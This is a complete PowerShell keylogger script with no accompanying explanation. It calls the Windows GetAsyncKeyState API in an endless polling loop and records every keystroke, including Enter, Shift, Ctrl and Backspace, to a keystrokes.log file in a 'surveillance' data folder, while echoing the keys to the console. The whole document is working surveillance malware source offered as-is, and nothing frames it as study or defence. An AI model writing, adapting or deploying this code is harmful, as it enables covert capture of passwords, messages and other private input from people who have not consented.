$Path = "$PSScriptRoot\..\..\data\surveillance\keystrokes.log"

$Signatures = @"
[DllImport("user32.dll")]
public static extern short GetAsyncKeyState(int vKey);
"@

Add-Type -MemberDefinition $Signatures -Name "Keyboard" -Namespace "Win32"

$LogDir = Split-Path $Path
if (!(Test-Path $LogDir)) { New-Item -ItemType Directory -Path $LogDir -Force }

"--- Keylogger Started: $(Get-Date) ---" | Out-File -FilePath $Path -Append

while ($true) {
    for ($ascii = 8; $ascii -le 222; $ascii++) {
        if ([Win32.Keyboard]::GetAsyncKeyState($ascii) -eq -32767) {
            $Key = [char]$ascii
            
            # Handle special keys
            if ($ascii -eq 8) { $Key = "[BACKSPACE]" }
            elseif ($ascii -eq 9) { $Key = "[TAB]" }
            elseif ($ascii -eq 13) { $Key = "[ENTER]`n" }
            elseif ($ascii -eq 16) { $Key = "[SHIFT]" }
            elseif ($ascii -eq 17) { $Key = "[CTRL]" }
            elseif ($ascii -eq 18) { $Key = "[ALT]" }
            elseif ($ascii -eq 20) { $Key = "[CAPSLOCK]" }
            elseif ($ascii -eq 27) { $Key = "[ESC]" }
            elseif ($ascii -eq 32) { $Key = " " }
            elseif ($ascii -eq 46) { $Key = "[DEL]" }
            
            Write-Host -NoNewline $Key
            $Key | Out-File -FilePath $Path -Append -NoNewline
        }
    }
    Start-Sleep -Milliseconds 10
}
